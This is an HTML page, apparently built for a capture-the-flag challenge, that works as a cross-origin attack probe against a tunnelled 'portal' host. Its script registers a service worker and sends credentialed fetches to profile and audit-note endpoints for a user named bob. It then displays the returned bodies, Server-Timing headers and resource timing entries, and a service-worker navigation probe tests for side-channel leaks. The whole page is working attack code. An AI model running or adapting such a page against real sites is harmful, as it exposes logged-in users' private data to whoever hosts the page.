<!doctype html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Acme Audit Probe</title>
  <style>
    body { font: 16px/1.5 system-ui, sans-serif; max-width: 900px; margin: 32px auto; padding: 0 16px; background:#101827; color:#e8eef8; }
    button { padding:10px 14px; margin:6px 6px 6px 0; cursor:pointer; }
    pre { white-space:pre-wrap; overflow-wrap:anywhere; background:#0a111d; border:1px solid #34445d; padding:14px; border-radius:8px; }
    .muted { color:#a9b7cc; }
  </style>
</head>
<body>
  <h1>Acme Audit Probe</h1>
  <p class="muted">CTF diagnostic page. It displays browser response/performance metadata locally; it does not send results to a third party.</p>
  <p>Portal origin: <code id="portal"></code></p>
  <button id="normal">일반 fetch 메타데이터 확인</button>
  <button id="nav">Service Worker navigation 실험</button>
  <button id="clear">결과 지우기</button>
  <pre id="out">Service Worker를 등록하는 중…</pre>
<script>
const PORTAL = 'https://seller-machines-lesser-calm.trycloudflare.com';
const out = document.querySelector("#out");
document.querySelector("#portal").textContent = PORTAL;
function log(value) {
  out.textContent += "\n\n" + (typeof value === "string" ? value : JSON.stringify(value, null, 2));
}
function summarizeEntries() {
  return performance.getEntries().map(e => ({
    entryType: e.entryType,
    name: e.name,
    initiatorType: e.initiatorType,
    responseStatus: e.responseStatus,
    workerStart: e.workerStart,
    responseStart: e.responseStart,
    responseEnd: e.responseEnd,
    transferSize: e.transferSize,
    encodedBodySize: e.encodedBodySize,
    decodedBodySize: e.decodedBodySize,
    serverTiming: e.serverTiming?.map(s => ({name:s.name, duration:s.duration, description:s.description}))
  }));
}
(async () => {
  if (!("serviceWorker" in navigator)) {
    out.textContent = "이 브라우저는 Service Worker를 지원하지 않습니다.";
    return;
  }
  try {
    await navigator.serviceWorker.register("./sw.js", {scope:"./"});
    await navigator.serviceWorker.ready;
    out.textContent = "Service Worker 등록 완료. 버튼을 눌러 실험하세요.";
  } catch (e) {
    out.textContent = "Service Worker 등록 실패: " + e;
  }
})();

document.querySelector("#normal").onclick = async () => {
  out.textContent = "일반 fetch 실행 중…";
  performance.clearResourceTimings();
  const targets = [
    ["profile-search-bob", `${PORTAL}/api/profile/search?username=bob`],
    ["profile-me", `${PORTAL}/api/profile/me`],
    ["audit-note-bob", `${PORTAL}/api/profile/audit-note?employee_id=bob`]
  ];
  for (const [label, url] of targets) {
    try {
      const r = await fetch(url, {credentials:"include", mode:"cors", cache:"no-store"});
      const body = await r.text();
      log({label, status:r.status, headers:{serverTiming:r.headers.get("Server-Timing"), expose:r.headers.get("Access-Control-Expose-Headers")}, body});
    } catch(e) { log({label, error:String(e)}); }
  }
  log({performanceEntries:summarizeEntries()});
};

document.querySelector("#nav").onclick = () => {
  const target = prompt("search / me / note 중 입력", "search");
  if (!target) return;
  location.href = `./__sw_probe__?target=${encodeURIComponent(target)}`;
};
document.querySelector("#clear").onclick = () => out.textContent = "결과를 지웠습니다.";
</script>
</body>
</html>
